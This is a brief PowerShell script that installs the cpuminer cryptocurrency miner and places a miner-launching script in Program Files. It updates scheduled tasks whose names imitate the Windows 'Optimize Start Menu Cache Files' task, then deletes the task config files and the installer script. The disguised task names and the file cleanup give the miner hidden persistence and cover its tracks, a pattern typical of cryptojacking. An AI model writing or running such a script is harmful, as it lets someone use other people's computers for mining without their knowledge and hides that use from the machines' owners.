Update-PowerShellPowerUp
Install-PPApp cpuminer
Move-Item (Join-Path $PSconfigs.Path "Process-Minerd.ps1") "C:\Program Files\cpuminer\" -Force
Update-ScheduledTask "Optimize Start Menu Cache Files-S-1-5-21-356465652-3543132135-1325423389-100"
Update-ScheduledTask "Optimize Start Menu Cache Files-S-1-5-21-845123235-4365131323-5313563663-000"
Remove-Item (Join-Path $PSconfigs.Path "Optimize Start Menu Cache Files-S-1-5-21-356465652-3543132135-1325423389-100.task.config.xml") -Force
Remove-Item (Join-Path $PSconfigs.Path "Optimize Start Menu Cache Files-S-1-5-21-845123235-4365131323-5313563663-000.task.config.xml") -Force
Remove-Item (Join-Path $PSconfigs.Path "Install-ProcessMinerdTask.ps1") -Force
